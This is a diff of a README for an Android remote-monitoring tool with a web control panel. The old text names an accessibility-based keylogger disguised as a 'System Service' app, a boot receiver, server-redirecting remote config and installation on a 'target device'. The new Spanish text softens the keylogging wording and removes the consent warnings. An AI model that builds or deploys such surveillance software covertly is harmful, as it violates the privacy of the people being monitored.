@@ -1,97 +1,100 @@
 # Android Monitor
 
-This project is a proof-of-concept Android application that demonstrates advanced system service capabilities, including background connectivity, accessibility features, and device monitoring. It includes a web-based control panel for managing connected devices. **This is for educational purposes only. Use responsibly and ensure compliance with all laws and ethical guidelines. Misuse can lead to legal consequences.**
+Panel de control web para monitoreo y gestión de dispositivos Android. Construido con Node.js/Socket.IO y frontend Nginx.
 
-## Features
-- **Web Control Panel**: A responsive UI to monitor and control multiple Android devices via Socket.IO.
-- **Android System Service**: Runs as a foreground service with boot receiver and keylogger (accessibility-based).
-- **Dockerized Deployment**: Easy setup with containerized backend (nginx for frontend, server for Socket.IO + APK generation).
-- **In-Memory Device Management**: Real-time device tracking via Socket.IO events (no external DB).
-- **Dynamic APK Building**: Generate customized APKs with user-specified config URL for server connectivity.
-- **Remote Config Management**: Apps fetch configuration from a remote JSON file, enabling dynamic server updates without reinstalling APK.
+**Uso educativo únicamente.** Respeta la privacidad y leyes locales.
 
-## Configuration Architecture
+## Arquitectura
 
-The application now uses a **remote configuration model**:
+```
+┌─────────────┐     /android      ┌──────────────┐
+│   Android   │◄─────────────────►│    Server    │
+│   Device    │   (WebSocket)     │  (Socket.IO) │
+└─────────────┘                   └──────┬───────┘
+                                         │ /frontend
+                                         ▼
+                                    ┌──────────┐
+                                    │  Nginx   │
+                                    │ + Static │
+                                    └──────────┘
+```
 
-1. **Config File** (JSON): Hosted on any accessible URL (GitHub, web server, etc.)
-   ```json
-   {
-     "server_url": "example.com:4000",
-     "screenshot_quality": 70,
-     "auto_screenshot": true
-   }
-   ```
-   - `server_url`: Domain or IP with optional port and protocol (http/https).
-     - Defaults: `http://` protocol, port `80` for http, port `443` for https.
-     - Examples: `"example.com"`, `"example.com:8080"`, `"https://example.com"`, `"https://ws.boo.bar:4000"`
-   - `screenshot_quality`: Optional integer (1-100) for JPEG compression quality. Default: 70. Higher = better quality, larger file.
+### Namespaces Socket.IO
 
-2. **APK Generation**: Build accepts a config URL instead of hardcoded IP/port
-3. **Config Validation**: 
-   - Apps validate config on startup
-   - Periodic validation every 60 seconds
-   - Automatic reconnection if config changes
+| Namespace | Descripción |
+|-----------|-------------|
+| `/android` | Conexiones de dispositivos Android |
+| `/frontend` | Conexiones del panel web |
 
-## Socket.IO Architecture
+## Stack
 
-The server uses **namespaces** to separate traffic between Android devices and the web frontend:
+- **Backend**: Node.js + Socket.IO + SQLite
+- **Frontend**: HTML/CSS/JS vanilla + jQuery
+- **Proxy**: Nginx
+- **Android**: Java (Android Studio)
 
-| Namespace | Path | Purpose |
-|-----------|------|---------|
-| `/android` | `http://server:4000/android` | Android device connections |
-| `/frontend` | `http://server:4000/frontend` | Web frontend connections |
+## Funcionalidades
 
-- Android apps automatically connect to the `/android` namespace (configured as a constant in `ConfigManager.SOCKET_NAMESPACE`)
-- The web frontend connects to the `/frontend` namespace
-- This separation ensures clean isolation between device traffic and control panel traffic
-
-## Prerequisites
-- Docker and Docker Compose installed.
+- Monitoreo de dispositivos en tiempo real
+- Captura de screenshots (manual y automática)
+- Logs en tiempo real del dispositivo
+- Generación dinámica de APK con configuración embebida
+- Configuración por defecto y por dispositivo (server URL, calidad de screenshot, auto-screenshot)
+- Persistencia en SQLite (dispositivos, configs, logs, screenshots)
 
 ## Setup
 
+```bash
+# Build y ejecución
+docker compose up --build
 
-### 1. Docker Setup
-This project uses Docker for the frontend (nginx + static files) and server (Socket.IO + Android APK generation). A `docker-compose.yml` file is included in the root directory for easy deployment.
+# Acceso
+http://localhost:4000
+```
 
-1. Clone the repository
+## Uso
 
-2. Build and run with Docker Compose:
-   ```
-   docker compose up --build
-   ```
+1. **Generar APK**: Click en "Build APK" → descargar e instalar en dispositivo
+2. **Seleccionar dispositivo**: Elegir del dropdown
+3. **Logs**: Ver en tiempo real (solo si el dispositivo está seleccionado)
+4. **Screenshot**: Click en botón o automático según config
+5. **Configuración**: Pestaña config para ajustar server URL, calidad, auto-screenshot por dispositivo
 
-- Nginx serves the frontend and proxies the socket.io server on http://localhost:4000
+## Desarrollo
 
-### 3. Access the Control Panel
-1. Open http://localhost:4000 in your browser.
-2. The dashboard will list connected devices.
+| Componente | Path | Notas |
+|------------|------|-------|
+| Servidor | `./server/` | Editar y rebuild: `docker compose build` |
+| Frontend | `./nginx/public/` | Cambios inmediatos (volumen mountado) |
+| APK | `./server/android-project/` | Build manual: `./gradlew assembleDebug` |
 
-### 4. Generate and Deploy APK
-1. Click "Build APK" – this triggers the server to compile a customized APK with the embedded config URL.
-2. Download the generated APK from the UI link.
-3. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-release.apk`).
-4. Grant Accessibility permissions to the "System Service" app for keylogging.
+## Estructura de archivos
 
-## Configuration Update Workflow
+```
+.
+├── docker-compose.yml
+├── nginx/
+│   ├── nginx.conf
+│   └── public/          # Frontend estático
+├── server/
+│   ├── db.js            # SQLite
+│   ├── server.js        # Socket.IO + API
+│   └── android-project/ # Código fuente APK
+└── screenshots/        # Generados por dispositivos
+```
 
-1. **Update Config File**: Modify your remote `settings.json` with new host:port
-2. **Option A - Manual Push**: Call `/api/validate-config` endpoint to trigger immediate revalidation across all connected apps
-3. **Option B - Wait for Restart**: Apps validate config on startup/reconnect
-4. Apps automatically disconnect from old server and connect to new one
+## Configuración
 
-## Development
-- **Server (Node.js)**: Edit in `./server/`. The server also handles Android APK builds in `./server/android-project/`. Rebuild Docker image after changes: `docker compose build android-server`.
-- **Frontend**: Static files in `./nginx/public/`. No rebuild needed (mounted via volume).
-- **Android App**: Source in `./server/android-project/app/`. For manual build: `cd server/android-project && ./gradlew assembleDebug -PserverUrl='https://example.com/settings.json'`.
+- **Server URL**: Endpoint donde el dispositivo se conecta
+- **Screenshot Quality**: 1-100 (default 70)
+- **Auto Screenshot**: Captura automática periódica
 
-## Security Notes
-- The app requests sensitive permissions (Accessibility, Boot Complete, Internet) – disclose to users.
-- Config file should be accessible but ideally protected (HTTPS recommended).
-- For ethical testing only; do not deploy without explicit consent.
+## Permisos Android
+
+- Internet
+- Boot completado
+- Accessibility (para captura de logs/screenshot)
 
 ## License
-MIT
 
-For issues, open a GitHub issue.
+MIT
